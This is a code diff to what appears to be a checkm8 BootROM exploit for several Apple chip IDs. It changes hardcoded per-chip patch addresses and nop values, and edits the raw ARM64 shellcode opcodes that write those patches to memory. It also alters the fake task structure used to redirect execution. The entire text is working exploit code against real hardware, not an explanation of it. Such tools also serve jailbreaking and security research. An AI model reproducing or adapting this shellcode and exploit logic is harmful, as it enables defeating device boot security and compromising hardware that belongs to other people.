@@ -8,30 +8,26 @@
 #	define IO_BUFFER_ADDR (0x18010D300)
 #	define SRTG "iBoot-1992.0.0.1.19"
 #	define PATCH_ADDR_0 (0x1000078B4)
-#	define PATCH_ADDR_1 (0x1000078BC)
-#	define PATCH_ADDR_2 (0x1000078C0)
-#	define PATCH_ADDR_3 (0x1000078E4)
-#	define PATCH_ADDR_4 (0x100007BAC)
+#	define PATCH_ADDR_1 (0x1000078C0)
+#	define PATCH_ADDR_2 (0x1000078E4)
+#	define PATCH_ADDR_3 (0x100007BAC)
 #	define PATCH_VAL_0 (0xD503201F) /* nop */
-#	define PATCH_VAL_1 (0x52800029) /* mov w9, #1 */
+#	define PATCH_VAL_1 (0xD503201F) /* nop */
 #	define PATCH_VAL_2 (0xD503201F) /* nop */
 #	define PATCH_VAL_3 (0xD503201F) /* nop */
-#	define PATCH_VAL_4 (0xD503201F) /* nop */
 #elif CPID == 0x7001
 #	define SYNOPSYS_ROUTINE_ADDR (0x1000064FC)
 #	define ARCH_TASK_TRAMP_ADDR (0x100010988)
 #	define IO_BUFFER_ADDR (0x18010D300)
 #	define SRTG "iBoot-1991.0.0.2.16"
 #	define PATCH_ADDR_0 (0x10000A714)
-#	define PATCH_ADDR_1 (0x10000A71C)
-#	define PATCH_ADDR_2 (0x10000A720)
-#	define PATCH_ADDR_3 (0x10000A744)
-#	define PATCH_ADDR_4 (0x10000AA08)
+#	define PATCH_ADDR_1 (0x10000A720)
+#	define PATCH_ADDR_2 (0x10000A744)
+#	define PATCH_ADDR_3 (0x10000AA08)
 #	define PATCH_VAL_0 (0xD503201F) /* nop */
-#	define PATCH_VAL_1 (0x52800029) /* mov w9, #1 */
+#	define PATCH_VAL_1 (0xD503201F) /* nop */
 #	define PATCH_VAL_2 (0xD503201F) /* nop */
 #	define PATCH_VAL_3 (0xD503201F) /* nop */
-#	define PATCH_VAL_4 (0xD503201F) /* nop */
 #elif CPID == 0x8000 || CPID == 0x8003
 #	define SYNOPSYS_ROUTINE_ADDR (0x100006718)
 #	define VROM_PAGE_TABLE_ADDR (0x1800C8400)
@@ -43,15 +39,13 @@
 #		define SRTG "iBoot-2234.0.0.2.22"
 #	endif
 #	define PATCH_ADDR_0 (0x100007924)
-#	define PATCH_ADDR_1 (0x100007934)
-#	define PATCH_ADDR_2 (0x10000792C)
-#	define PATCH_ADDR_3 (0x100007958)
-#	define PATCH_ADDR_4 (0x100007C9C)
+#	define PATCH_ADDR_1 (0x10000792C)
+#	define PATCH_ADDR_2 (0x100007958)
+#	define PATCH_ADDR_3 (0x100007C9C)
 #	define PATCH_VAL_0 (0xD503201F) /* nop */
-#	define PATCH_VAL_1 (0x52800038) /* mov w24, #1 */
+#	define PATCH_VAL_1 (0xD503201F) /* nop */
 #	define PATCH_VAL_2 (0xD503201F) /* nop */
 #	define PATCH_VAL_3 (0xD503201F) /* nop */
-#	define PATCH_VAL_4 (0xD503201F) /* nop */
 #endif
 
 #define MAGIC (0xB4)
@@ -329,9 +323,9 @@ checkm8_stage_patch(handle_t *handle) {
 	*shc++ = 0xD50E871F; /* tlbi alle3 */
 	*shc++ = 0xD5033F9F; /* dsb sy */
 	*shc++ = 0xD5033FDF; /* isb */
-	*shc++ = 0x100002A8; /* adr x8, #0x54 */
+	*shc++ = 0x10000268; /* adr x8, #0x4C */
 #else
-	*shc++ = 0x10000188; /* adr x8, #0x30 */
+	*shc++ = 0x10000148; /* adr x8, #0x28 */
 #endif
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB9000269; /* str w9, [x19] */
@@ -339,10 +333,8 @@ checkm8_stage_patch(handle_t *handle) {
 	*shc++ = 0xB9000289; /* str w9, [x20] */
 	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
 	*shc++ = 0xB90002A9; /* str w9, [x21] */
-	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
-	*shc++ = 0xB90002C9; /* str w9, [x22] */
 	*shc++ = 0xB9400109; /* ldr w9, [x8] */
-	*shc++ = 0xB90002E9; /* str w9, [x23] */
+	*shc++ = 0xB90002C9; /* str w9, [x22] */
 #if CPID == 0x8000 || CPID == 0x8003
 	*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
 	*shc++ = 0xB279014A; /* orr x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
@@ -358,13 +350,11 @@ checkm8_stage_patch(handle_t *handle) {
 	*shc++ = PATCH_VAL_0;
 	*shc++ = PATCH_VAL_1;
 	*shc++ = PATCH_VAL_2;
-	*shc++ = PATCH_VAL_3;
-	*shc = PATCH_VAL_4;
+	*shc = PATCH_VAL_3;
 	overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
 	overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
 	overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
 	overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
-	overwrite.fake_task.arch.x[23] = PATCH_ADDR_4;
 	overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
 	overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
 	overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
